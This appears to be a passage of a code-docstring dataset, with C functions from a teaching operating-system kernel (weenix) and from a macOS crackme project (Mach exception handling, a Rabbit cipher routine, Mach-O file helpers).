if the buf size is zero */\n                *end = '\\0';\n        /* the trailing null byte doesn't count towards the total\n         * ++str;\n         */\n        return str - buf;\n}", "path": "user\\lib\\libc\\vsnprintf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* As per the specification in mmobj.h, fill the page frame starting\n * at address pf->pf_addr with the contents of the page identified by\n * pf->pf_obj and pf->pf_pagenum. This function handles all\n * copy-on-write magic (i.e. if there is a shadow object which has\n * data for the pf->pf_pagenum-th page then we should take that data,\n * if no such shadow object exists we need to follow the chain of\n * shadow objects all the way to the bottom object and take the data\n * for the pf->pf_pagenum-th page from the last object in the chain).\n * It is important to use iteration rather than recursion here as a \n * recursive implementation can overflow the kernel stack when \n * looking down a long shadow chain */\n", "func_signal": "static int\nshadow_fillpage(mmobj_t *o, pframe_t *pf)", "code": "{\n    pframe_t *p = NULL;\n    mmobj_t *curr = o->mmo_shadowed;\n\n    while (p == NULL && curr != o->mmo_un.mmo_bottom_obj){\n        p = pframe_get_resident(curr, pf->pf_pagenum);\n        curr = curr->mmo_shadowed;\n    }\n    \n    if (p == NULL){\n        KASSERT(curr == o->mmo_un.mmo_bottom_obj);\n        int lookup_res = pframe_lookup(curr, pf->pf_pagenum, 1, &p);\n\n        if (lookup_res < 0){\n            return lookup_res;\n        }\n    }\n\n    KASSERT(p != NULL);\n\n    pframe_pin(pf);\n    memcpy(pf->pf_addr, p->pf_addr, PAGE_SIZE);\n    return 0;\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* Given a filename and a colon-delimited path, this function attempts\n * to open the named file using each element of the path as a prefix\n * for the file.  The result of the first successful open is returned,\n * otherwise -1 is returned */\n", "func_signal": "int _ldtryopen(const char *filename, const char *path)", "code": "{\n        char            buffer[2048];   /* shouldn't be overflown */\n        const char      *pos, *oldpos;\n        int             len, flen;\n        int             fd;\n\n        if (!path || !*path)\n                return -1;\n\n        flen = strlen(filename) + 1;\n\n        oldpos = pos = path;\n\n        /* ADDED: try w/ no prefix first */\n        strncpy(buffer, filename, flen);\n        fd = open(buffer, O_RDONLY, 0);\n        if (fd >= 0) {\n                return fd;\n        }\n        /* END ADDED */\n\n        while (*pos) {\n\n                for (; (*pos) && (*pos != ':'); pos++)\n                        /* LINTED */\n                        ;\n                len = pos - oldpos;\n                strncpy(buffer, oldpos, len + 1);\n                buffer[len] = '/';\n                strncpy(buffer + len + 1, filename, flen);\n\n                fd = open(buffer, O_RDONLY, 0);\n                if (fd >= 0) {\n                        return fd;\n                }\n\n                oldpos = ++pos;\n        }\n\n        return -1;\n}", "path": "user\\lib\\ld-weenix\\ldstart.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* This function finds and maps the shared object associated with the\n * specified module.  When it is done, it calls _ldlinkobj to perform\n * additional operations pertaining to the object's dependencies as\n * well as the managment of the object at runtime */\n", "func_signal": "void _ldloadobj(module_t *module)", "code": "{\n        unsigned long   bottom, top, size;\n        Elf32_Ehdr      *hdr;\n        Elf32_Phdr      *phdr;\n        Elf32_Dyn       *dyn = 0;\n        char            *loc;\n        int             fd, i;\n\n        /* attempt to open library */\n        fd = _ldtryopen(module->name, _ldenv.ld_library_path);\n        if (fd == -1)\n                fd = _ldtryopen(module->name, module->runpath);\n        if (fd == -1)\n                fd = _ldtryopen(module->name, default_runpath);\n        if (fd == -1) {\n                printf(err_cantfind, module->name);\n                exit(1);\n        }\n\n        /* compute image size */\n        hdr = (Elf32_Ehdr *)mmap(0, pagesize, PROT_READ | PROT_EXEC,\n                                 MAP_SHARED, fd, 0);\n        phdr = (Elf32_Phdr *)(hdr->e_phoff + (unsigned long)hdr);\n\n        bottom = (unsigned long) - 1;\n        top = 0;\n        for (i = 0; i < hdr->e_phnum; i++) {\n                if (phdr[i].p_type == PT_LOAD) {\n                        if (phdr[i].p_vaddr < bottom)\n                                bottom = phdr[i].p_vaddr;\n                        if (phdr[i].p_vaddr + phdr[i].p_memsz > top)\n                                top = phdr[i].p_vaddr + phdr[i].p_memsz;\n                }\n        }\n\n        bottom = trunc_page(bottom);\n        top = round_page(top);\n        size = top - bottom;\n\n        loc = (char *)mmap(NULL, size, PROT_NONE, MAP_SHARED, fd, 0);\n        munmap(loc, size);\n\n        /* Figure out whether or not things marked readonly need to\n         * be writeable (find DT_TEXTREL). This is kind of a mess,\n         * as we have to do this before we've mapped in the dynamic\n         * section (need to read from file directly). */\n        int dynoff;\n        Elf32_Dyn curdyn;\n        int textrel = 0;\n        for (i = 0; i < hdr->e_phnum; i++) {\n                if (phdr[i].p_type == PT_DYNAMIC) {\n                        dynoff = phdr[i].p_offset;\n                        break;\n                }\n        }\n        lseek(fd, dynoff, SEEK_SET);\n        do {\n                if ((int)sizeof(curdyn) > read(fd, &curdyn, sizeof(curdyn)))\n                        exit(1);\n\n                if (curdyn.d_tag == DT_TEXTREL) {\n                        textrel = 1;\n                        break;\n                }\n        } while (curdyn.d_tag != DT_NULL);\n\n        for (i = 0; i < hdr->e_phnum; i++) {\n                if (phdr[i].p_type == PT_LOAD)\n                        _ldmapsect(fd, (unsigned long)loc - bottom, phdr + i, textrel);\n                else if (phdr[i].p_type == PT_DYNAMIC)\n                        dyn = (Elf32_Dyn *)(loc + phdr[i].p_vaddr);\n        }\n        munmap(hdr, pagesize);\n        close(fd);\n\n        /* set up additional module information */\n        _ldlinkobj(module, loc - bottom, dyn);\n}", "path": "user\\lib\\ld-weenix\\ldstart.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * simple_strtoull - convert a string to an unsigned long long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "unsigned long long simple_strtoull(const char *cp, char **endp, unsigned int base)", "code": "{\n        unsigned long long result = 0, value;\n\n        if (!base) {\n                base = 10;\n                if (*cp == '0') {\n                        base = 8;\n                        cp++;\n                        if ((*cp == 'x') && isxdigit(cp[1])) {\n                                cp++;\n                                base = 16;\n                        }\n                }\n        }\n        while (isxdigit(*cp) && (value = isdigit(*cp) ? *cp - '0' : (islower(*cp)\n                                         ? toupper(*cp) : *cp) - 'A' + 10) < base) {\n                result = result * base + value;\n                cp++;\n        }\n        if (endp)\n                *endp = (char *)cp;\n        return result;\n}", "path": "user\\lib\\libc\\vsscanf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * Clears all interrupts and halts, meaning that we will never run\n * again.\n */\n", "func_signal": "static void\nhard_shutdown()", "code": "{\n#ifdef __DRIVERS__\n        vt_print_shutdown();\n#endif\n        __asm__ volatile(\"cli; hlt\");\n}", "path": "kernel\\main\\kmain.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * vsscanf - Unformat a buffer into a list of arguments\n * @buf:        input buffer\n * @fmt:        format of buffer\n * @args:       arguments\n */\n", "func_signal": "int vsscanf(const char *buf, const char *fmt, va_list args)", "code": "{\n        const char *str = buf;\n        char *next;\n        char digit;\n        int num = 0;\n        int qualifier;\n        int base;\n        int field_width;\n        int is_sign = 0;\n\n        while (*fmt && *str) {\n                /* skip any white space in format */\n                /* white space in format matchs any amount of\n                 * white space, including none, in the input.\n                 */\n                if (isspace(*fmt)) {\n                        while (isspace(*fmt))\n                                ++fmt;\n                        while (isspace(*str))\n                                ++str;\n                }\n\n                /* anything that is not a conversion must match exactly */\n                if (*fmt != '%' && *fmt) {\n                        if (*fmt++ != *str++)\n                                break;\n                        continue;\n                }\n\n                if (!*fmt)\n                        break;\n                ++fmt;\n\n                /* skip this conversion.\n                 * advance both strings to next white space\n                 */\n                if (*fmt == '*') {\n                        while (!isspace(*fmt) && *fmt)\n                                fmt++;\n                        while (!isspace(*str) && *str)\n                                str++;\n                        continue;\n                }\n\n                /* get field width */\n                field_width = -1;\n                if (isdigit(*fmt))\n                        field_width = skip_atoi(&fmt);\n\n                /* get conversion qualifier */\n                qualifier = -1;\n                if (*fmt == 'h' || *fmt == 'l' || *fmt == 'L' ||\n                    *fmt == 'Z' || *fmt == 'z') {\n                        qualifier = *fmt++;\n                        if (unlikely(qualifier == *fmt)) {\n                                if (qualifier == 'h') {\n                                        qualifier = 'H';\n                                        fmt++;\n                                } else if (qualifier == 'l') {\n                                        qualifier = 'L';\n                                        fmt++;\n                                }\n                        }\n                }\n                base = 10;\n                is_sign = 0;\n\n                if (!*fmt || !*str)\n                        break;\n\n                switch (*fmt++) {\n                        case 'c': {\n                                char *s = (char *) va_arg(args, char *);\n                                if (field_width == -1)\n                                        field_width = 1;\n                                do {\n                                        *s++ = *str++;\n                                } while (--field_width > 0 && *str);\n                                num++;\n                        }\n                        continue;\n                        case 's': {\n                                char *s = (char *) va_arg(args, char *);\n                                if (field_width == -1)\n                                        field_width = INT_MAX;\n                                /* first, skip leading white space in buffer */\n                                while (isspace(*str))\n                                        str++;\n\n                                /* now copy until next white space */\n                                while (*str && !isspace(*str) && field_width--) {\n                                        *s++ = *str++;\n                                }\n                                *s = '\\0';\n                                num++;\n                        }\n                        continue;\n                        case 'n':\n                                /* return number of characters read so far */\n                        {\n                                int *i = (int *)va_arg(args, int *);\n                                *i = str - buf;\n                        }\n                        continue;\n                        case 'o':\n                                base = 8;\n                                break;\n                        case 'x':\n                        case 'X':\n                                base = 16;\n                                break;\n                        case 'i':\n                                base = 0;\n                        case 'd':\n                                is_sign = 1;\n                        case 'u':\n                                break;\n                        case '%':\n                                /* looking for '%' in str */\n                                if (*str++ != '%')\n                                        return num;\n                                continue;\n                        default:\n                                /* invalid format; stop here */\n                                return num;\n                }\n\n                /* have some sort of integer conversion.\n                 * first, skip white space in buffer.\n                 */\n                while (isspace(*str))\n                        str++;\n\n                digit = *str;\n                if (is_sign && digit == '-')\n                        digit = *(str + 1);\n\n                if (!digit\n                    || (base == 16 && !isxdigit(digit))\n                    || (base == 10 && !isdigit(digit))\n                    || (base == 8 && (!isdigit(digit) || digit > '7'))\n                    || (base == 0 && !isdigit(digit)))\n                        break;\n\n                switch (qualifier) {\n                        case 'H':       /* that's 'hh' in format */\n                                if (is_sign) {\n                                        signed char *s = (signed char *) va_arg(args, signed char *);\n                                        *s = (signed char) simple_strtol(str, &next, base);\n                                } else {\n                                        unsigned char *s = (unsigned char *) va_arg(args, unsigned char *);\n                                        *s = (unsigned char) simple_strtoul(str, &next, base);\n                                }\n                                break;\n                        case 'h':\n                                if (is_sign) {\n                                        short *s = (short *) va_arg(args, short *);\n                                        *s = (short) simple_strtol(str, &next, base);\n                                } else {\n                                        unsigned short *s = (unsigned short *) va_arg(args, unsigned short *);\n                                        *s = (unsigned short) simple_strtoul(str, &next, base);\n                                }\n                                break;\n                        case 'l':\n                                if (is_sign) {\n                                        long *l = (long *) va_arg(args, long *);\n                                        *l = simple_strtol(str, &next, base);\n                                } else {\n                                        unsigned long *l = (unsigned long *) va_arg(args, unsigned long *);\n                                        *l = simple_strtoul(str, &next, base);\n                                }\n                                break;\n                        case 'L':\n                                if (is_sign) {\n                                        long long *l = (long long *) va_arg(args, long long *);\n                                        *l = simple_strtoll(str, &next, base);\n                                } else {\n                                        unsigned long long *l = (unsigned long long *) va_arg(args, unsigned long long *);\n                                        *l = simple_strtoull(str, &next, base);\n                                }\n                                break;\n                        case 'Z':\n                        case 'z': {\n                                size_t *s = (size_t *) va_arg(args, size_t *);\n                                *s = (size_t) simple_strtoul(str, &next, base);\n                        }\n                        break;\n                        default:\n                                if (is_sign) {\n                                        int *i = (int *) va_arg(args, int *);\n                                        *i = (int) simple_strtol(str, &next, base);\n                                } else {\n                                        unsigned int *i = (unsigned int *) va_arg(args, unsigned int *);\n                                        *i = (unsigned int) simple_strtoul(str, &next, base);\n                                }\n                                break;\n                }\n                num++;\n\n                if (!next)\n                        break;\n                str = next;\n        }\n        return num;\n}", "path": "user\\lib\\libc\\vsscanf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * This function is called from kmain, however it is not running in a\n * thread context yet. It should create the idle process which will\n * start executing idleproc_run() in a real thread context.  To start\n * executing in the new process's context call context_make_active(),\n * passing in the appropriate context. This function should _NOT_\n * return.\n *\n * Note: Don't forget to set curproc and curthr appropriately.\n *\n * @param arg1 the first argument (unused)\n * @param arg2 the second argument (unused)\n */\n", "func_signal": "static void *\nbootstrap(int arg1, void *arg2)", "code": "{\n    /* necessary to finalize page table information */\n    pt_template_init();\n\n    char *name = \"idle process\";\n\n    proc_t *idle_proc = proc_create(name);\n\n    if (idle_proc == NULL){\n        panic(\"idle proc is NULL :( \\n\");\n    }\n\n    KASSERT(idle_proc->p_pid == 0);\n\n    kthread_t *idle_thread = kthread_create(idle_proc, idleproc_run, NULL, NULL);\n\n    if (idle_thread == NULL){\n        panic(\"idle thread is NULL :( \\n\");\n    }\n\n    curproc = idle_proc;\n    curthr = idle_thread;\n\n    context_make_active(&idle_thread->kt_ctx);   \n\n    panic(\"weenix returned to bootstrap()!!! BAD!!!\\n\");\n    return NULL;\n}", "path": "kernel\\main\\kmain.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * This is the first real C function ever called. It performs a lot of\n * hardware-specific initialization, then creates a pseudo-context to\n * execute the bootstrap function in.\n */\n", "func_signal": "void\nkmain()", "code": "{\n        GDB_CALL_HOOK(boot);\n\n        dbg_init();\n        dbgq(DBG_CORE, \"Kernel binary:\\n\");\n        dbgq(DBG_CORE, \"  text: 0x%p-0x%p\\n\", &kernel_start_text, &kernel_end_text);\n        dbgq(DBG_CORE, \"  data: 0x%p-0x%p\\n\", &kernel_start_data, &kernel_end_data);\n        dbgq(DBG_CORE, \"  bss:  0x%p-0x%p\\n\", &kernel_start_bss, &kernel_end_bss);\n\n        page_init();\n\n        pt_init();\n        slab_init();\n        pframe_init();\n\n        acpi_init();\n        apic_init();\n\t      pci_init();\n        intr_init();\n\n        gdt_init();\n\n        /* initialize slab allocators */\n#ifdef __VM__\n        anon_init();\n        shadow_init();\n#endif\n        vmmap_init();\n        proc_init();\n        kthread_init();\n\n#ifdef __DRIVERS__\n        bytedev_init();\n        blockdev_init();\n#endif\n\n        void *bstack = page_alloc();\n        pagedir_t *bpdir = pt_get();\n        KASSERT(NULL != bstack && \"Ran out of memory while booting.\");\n        context_setup(&bootstrap_context, bootstrap, 0, NULL, bstack, PAGE_SIZE, bpdir);\n        context_make_active(&bootstrap_context);\n\n        panic(\"\\nReturned to kmain()!!!\\n\");\n}", "path": "kernel\\main\\kmain.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/*\n * You'll want to use the shadow_allocator to allocate the mmobj to\n * return, then then initialize it. Take a look in mm/mmobj.h for\n * macros which can be of use here. Make sure your initial\n * reference count is correct.\n */\n", "func_signal": "mmobj_t *\nshadow_create()", "code": "{\n    static uint32_t ncreated = 0;\n\n    if (ncreated++ % 10 == 0){\n        shadowd_wakeup();\n    }\n\n    mmobj_t *newshadow = slab_obj_alloc(shadow_allocator);\n\n    if (newshadow != NULL){\n        mmobj_init(newshadow, &shadow_mmobj_ops);\n    }\n\n    return newshadow;\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/*\n * Increment the reference count on the object.\n */\n", "func_signal": "static void\nshadow_ref(mmobj_t *o)", "code": "{\n    KASSERT(o->mmo_ops == &shadow_mmobj_ops);\n    o->mmo_refcount++;\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* This function looks up the given page in this shadow object. The\n * forwrite argument is true if the page is being looked up for\n * writing, false if it is being looked up for reading. This function\n * must handle all do-not-copy-on-not-write magic (i.e. when forwrite\n * is false find the first shadow object in the chain which has the\n * given page resident). copy-on-write magic (necessary when forwrite\n * is true) is handled in shadow_fillpage, not here. It is important to\n * use iteration rather than recursion here as a recursive implementation\n * can overflow the kernel stack when looking down a long shadow chain */\n", "func_signal": "static int\nshadow_lookuppage(mmobj_t *o, uint32_t pagenum, int forwrite, pframe_t **pf)", "code": "{\n    if (forwrite){\n        return pframe_get(o, pagenum, pf);\n    }\n\n    pframe_t *p = NULL;\n    mmobj_t *curr = o;\n\n    while (p == NULL && curr->mmo_shadowed != NULL){\n        p = pframe_get_resident(curr, pagenum);\n        curr = curr->mmo_shadowed;\n    }\n\n    if (p == NULL){\n        return pframe_lookup(curr, pagenum, 0, pf);\n    }\n   \n    *pf = p;\n    return 0;\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/*\n * Decrement the reference count on the object. If, however, the\n * reference count on the object reaches the number of resident\n * pages of the object, we can conclude that the object is no\n * longer in use and, since it is a shadow object, it will never\n * be used again. You should unpin and uncache all of the object's\n * pages and then free the object itself.\n */\n", "func_signal": "static void\nshadow_put(mmobj_t *o)", "code": "{\n    KASSERT(o->mmo_refcount > o->mmo_nrespages && \"refcount == nrespages already!\");\n    KASSERT(o->mmo_nrespages >= 0);\n\n    if (o->mmo_refcount == o->mmo_nrespages + 1){\n        pframe_t *p;\n        list_iterate_begin(&o->mmo_respages, p, pframe_t, pf_olink){\n            pframe_unpin(p);\n            pframe_free(p);\n        } list_iterate_end();\n\n        mmobj_t *shadowed_obj = o->mmo_shadowed;\n        mmobj_t *bottom_obj = o->mmo_un.mmo_bottom_obj;\n\n        shadowed_obj->mmo_ops->put(shadowed_obj);\n        bottom_obj->mmo_ops->put(bottom_obj);\n\n        slab_obj_free(shadow_allocator, o);\n    } else {\n        o->mmo_refcount--;\n    }\n}", "path": "kernel\\vm\\shadow.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/**\n * simple_strtol - convert a string to a signed long\n * @cp: The start of the string\n * @endp: A pointer to the end of the parsed string will be placed here\n * @base: The number base to use\n */\n", "func_signal": "long simple_strtol(const char *cp, char **endp, unsigned int base)", "code": "{\n        if (*cp == '-')\n                return -simple_strtoul(cp + 1, endp, base);\n        return simple_strtoul(cp, endp, base);\n}", "path": "user\\lib\\libc\\vsscanf.c", "repo_name": "leonee/weenix", "stars": 32, "license": "None", "language": "c", "size": 742}
{"docstring": "/* __NDR_convert__int_rep__Reply__mach_exception_raise_t__RetCode__defined */\n", "func_signal": "mig_internal kern_return_t __MIG_check__Reply__mach_exception_raise_t(__Reply__mach_exception_raise_t *Out0P)", "code": "{\n\n\ttypedef __Reply__mach_exception_raise_t __Reply;\n\tif (Out0P->Head.msgh_id != 2505) {\n\t    if (Out0P->Head.msgh_id == MACH_NOTIFY_SEND_ONCE)\n\t\t{ return MIG_SERVER_DIED; }\n\t    else\n\t\t{ return MIG_REPLY_MISMATCH; }\n\t}\n\n#if\t__MigTypeCheck\n\tif ((Out0P->Head.msgh_bits & MACH_MSGH_BITS_COMPLEX) ||\n\t    (Out0P->Head.msgh_size != (mach_msg_size_t)sizeof(__Reply)))\n\t\t{ return MIG_TYPE_ERROR ; }\n#endif\t/* __MigTypeCheck */\n\n#if defined(__NDR_convert__int_rep__Reply__mach_exception_raise_t__RetCode__defined)\n\tif (Out0P->NDR.int_rep != NDR_record.int_rep)\n\t\t__NDR_convert__int_rep__Reply__mach_exception_raise_t__RetCode(&Out0P->RetCode, Out0P->NDR.int_rep);\n#endif\t/* __NDR_convert__int_rep__Reply__mach_exception_raise_t__RetCode__defined */\n\t{\n\t\treturn Out0P->RetCode;\n\t}\n}", "path": "crackme\\mach_excUser.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "// write modified buffer to a file\n", "func_signal": "static uint8_t write_buffer(const uint8_t *targetBuffer, const char *originalTarget, const uint32_t fileSize)", "code": "{\n    FILE *output = NULL;\n    char extension[] = \".patched\";\n    uint32_t outputNameSize = strlen(originalTarget) + strlen(extension) + 1;\n    char *outputName = NULL;\n    MALLOC(outputName,outputNameSize);\n    strncpy(outputName, originalTarget, strlen(originalTarget)+1);\n    strncat(outputName, extension, sizeof(extension));\n    outputName[outputNameSize-1] = '\\0';\n    \n    output = fopen(outputName, \"wb\");\n    if (!output)\n    {\n        printf(\"[ERROR] Could not open file to write\\n\");\n        return(1);\n    }\n    \n    if (fwrite(targetBuffer, fileSize, 1, output) < 1)\n    {\n        printf(\"[ERROR] Write failed!\\n\");\n        fclose(output);\n        free(outputName);\n        return(1);\n    }\n    \n    free(outputName);\n    fclose(output);\n    return(0);\n}", "path": "manglemacho\\main.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Calculate the next internal state */\n", "func_signal": "static void RABBIT_next_state(RABBIT_ctx2 *p_instance)", "code": "{\n   /* Temporary variables */\n   u32 g[8], c_old[8], i;\n\n   /* Save old counter values */\n   for (i=0; i<8; i++)\n      c_old[i] = p_instance->c[i];\n    EVIL_ASM5;\n   /* Calculate new counter values */\n   p_instance->c[0] = U32V(p_instance->c[0] + 0x4D34D34D + p_instance->carry);\n   p_instance->c[1] = U32V(p_instance->c[1] + 0xD34D34D3 + (p_instance->c[0] < c_old[0]));\n   p_instance->c[2] = U32V(p_instance->c[2] + 0x34D34D34 + (p_instance->c[1] < c_old[1]));\n   p_instance->c[3] = U32V(p_instance->c[3] + 0x4D34D34D + (p_instance->c[2] < c_old[2]));\n   p_instance->c[4] = U32V(p_instance->c[4] + 0xD34D34D3 + (p_instance->c[3] < c_old[3]));\n   p_instance->c[5] = U32V(p_instance->c[5] + 0x34D34D34 + (p_instance->c[4] < c_old[4]));\n   p_instance->c[6] = U32V(p_instance->c[6] + 0x4D34D34D + (p_instance->c[5] < c_old[5]));\n   p_instance->c[7] = U32V(p_instance->c[7] + 0xD34D34D3 + (p_instance->c[6] < c_old[6]));\n   p_instance->carry = (p_instance->c[7] < c_old[7]);\n   \n   /* Calculate the g-values */\n   for (i=0;i<8;i++)\n      g[i] = RABBIT_g_func(U32V(p_instance->x[i] + p_instance->c[i]));\n\n   /* Calculate new state values */\n   p_instance->x[0] = U32V(g[0] + ROTL32(g[7],16) + ROTL32(g[6], 16));\n   p_instance->x[1] = U32V(g[1] + ROTL32(g[0], 8) + g[7]);\n   p_instance->x[2] = U32V(g[2] + ROTL32(g[1],16) + ROTL32(g[0], 16));\n   p_instance->x[3] = U32V(g[3] + ROTL32(g[2], 8) + g[1]);\n   p_instance->x[4] = U32V(g[4] + ROTL32(g[3],16) + ROTL32(g[2], 16));\n   p_instance->x[5] = U32V(g[5] + ROTL32(g[4], 8) + g[3]);\n   p_instance->x[6] = U32V(g[6] + ROTL32(g[5],16) + ROTL32(g[4], 16));\n   p_instance->x[7] = U32V(g[7] + ROTL32(g[6], 8) + g[5]);\n}", "path": "crackme\\ciphers\\rabbit.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "// verify if it's a valid mach-o binary\n", "func_signal": "__attribute__ ((aligned (512))) void verify_macho(uint8_t *targetBuffer)", "code": "{\n    uint32_t magic = *(uint32_t*)(targetBuffer);\n    printf(\"Magic %x\\n\", magic);\n\tif (magic == FAT_CIGAM ||   // fat binary\n        magic == MH_MAGIC  ||   // non-fat 32bits\n        magic == MH_MAGIC_64)   // non-fat 64bits\n\t{\n        if (magic == FAT_CIGAM)\n        {\n            headerInfo.isFat = 1;\n        }\n\t}\n    else\n    {\n        printf(\"[ERROR] Not a valid mach-o binary!\\n\");\n\t\texit(1);\n    }\n}", "path": "crypt_functions\\main.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
{"docstring": "/* Routine mach_exception_raise_state */\n", "func_signal": "mig_external kern_return_t mach_exception_raise_state\n(\n\tmach_port_t exception_port,\n\texception_type_t exception,\n\tconst mach_exception_data_t code,\n\tmach_msg_type_number_t codeCnt,\n\tint *flavor,\n\tconst thread_state_t old_state,\n\tmach_msg_type_number_t old_stateCnt,\n\tthread_state_t new_state,\n\tmach_msg_type_number_t *new_stateCnt\n)", "code": "{\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\texception_type_t exception;\n\t\tmach_msg_type_number_t codeCnt;\n\t\tint64_t code[2];\n\t\tint flavor;\n\t\tmach_msg_type_number_t old_stateCnt;\n\t\tnatural_t old_state[144];\n\t} Request;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tint flavor;\n\t\tmach_msg_type_number_t new_stateCnt;\n\t\tnatural_t new_state[144];\n\t\tmach_msg_trailer_t trailer;\n\t} Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\n#ifdef  __MigPackStructs\n#pragma pack(4)\n#endif\n\ttypedef struct {\n\t\tmach_msg_header_t Head;\n\t\tNDR_record_t NDR;\n\t\tkern_return_t RetCode;\n\t\tint flavor;\n\t\tmach_msg_type_number_t new_stateCnt;\n\t\tnatural_t new_state[144];\n\t} __Reply;\n#ifdef  __MigPackStructs\n#pragma pack()\n#endif\n\t/*\n\t * typedef struct {\n\t * \tmach_msg_header_t Head;\n\t * \tNDR_record_t NDR;\n\t * \tkern_return_t RetCode;\n\t * } mig_reply_error_t;\n\t */\n\n\tunion {\n\t\tRequest In;\n\t\tReply Out;\n\t} Mess;\n\n\tRequest *InP = &Mess.In;\n\tReply *Out0P = &Mess.Out;\n\n\tmach_msg_return_t msg_result;\n\tunsigned int msgh_size;\n\tunsigned int msgh_size_delta;\n\n\n#ifdef\t__MIG_check__Reply__mach_exception_raise_state_t__defined\n\tkern_return_t check_result;\n#endif\t/* __MIG_check__Reply__mach_exception_raise_state_t__defined */\n\n\t__DeclareSendRpc(2406, \"mach_exception_raise_state\")\n\n\tInP->NDR = NDR_record;\n\n\tInP->exception = exception;\n\n\tif (codeCnt > 2) {\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) InP->code, (const char *) code, 8 * codeCnt);\n\n\tInP->codeCnt = codeCnt;\n\n\tmsgh_size_delta = (8 * codeCnt);\n\tmsgh_size = (mach_msg_size_t)(sizeof(Request) - 592) + msgh_size_delta;\n\tInP = (Request *) ((pointer_t) InP + msgh_size_delta - 16);\n\n\tInP->flavor = *flavor;\n\n\tif (old_stateCnt > 144) {\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) InP->old_state, (const char *) old_state, 4 * old_stateCnt);\n\n\tInP->old_stateCnt = old_stateCnt;\n\n\tmsgh_size += (4 * old_stateCnt);\n\tInP = &Mess.In;\n\tInP->Head.msgh_bits =\n\t\tMACH_MSGH_BITS(19, MACH_MSG_TYPE_MAKE_SEND_ONCE);\n\t/* msgh_size passed as argument */\n\tInP->Head.msgh_request_port = exception_port;\n\tInP->Head.msgh_reply_port = mig_get_reply_port();\n\tInP->Head.msgh_id = 2406;\n\n\t__BeforeSendRpc(2406, \"mach_exception_raise_state\")\n\tmsg_result = mach_msg(&InP->Head, MACH_SEND_MSG|MACH_RCV_MSG|MACH_MSG_OPTION_NONE, msgh_size, (mach_msg_size_t)sizeof(Reply), InP->Head.msgh_reply_port, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);\n\t__AfterSendRpc(2406, \"mach_exception_raise_state\")\n\tif (msg_result != MACH_MSG_SUCCESS) {\n\t\t__MachMsgErrorWithoutTimeout(msg_result);\n\t\t{ return msg_result; }\n\t}\n\n\n#if\tdefined(__MIG_check__Reply__mach_exception_raise_state_t__defined)\n\tcheck_result = __MIG_check__Reply__mach_exception_raise_state_t((__Reply__mach_exception_raise_state_t *)Out0P);\n\tif (check_result != MACH_MSG_SUCCESS)\n\t\t{ return check_result; }\n#endif\t/* defined(__MIG_check__Reply__mach_exception_raise_state_t__defined) */\n\n\t*flavor = Out0P->flavor;\n\n\tif (Out0P->new_stateCnt > 144) {\n\t\t(void)memcpy((char *) new_state, (const char *) Out0P->new_state, 4 *  144);\n\t\t*new_stateCnt = Out0P->new_stateCnt;\n\t\t{ return MIG_ARRAY_TOO_LARGE; }\n\t}\n\t(void)memcpy((char *) new_state, (const char *) Out0P->new_state, 4 * Out0P->new_stateCnt);\n\n\t*new_stateCnt = Out0P->new_stateCnt;\n\n\treturn KERN_SUCCESS;\n}", "path": "crackme\\mach_excUser.c", "repo_name": "gdbinit/crackme_nr1", "stars": 37, "license": "None", "language": "c", "size": 267}
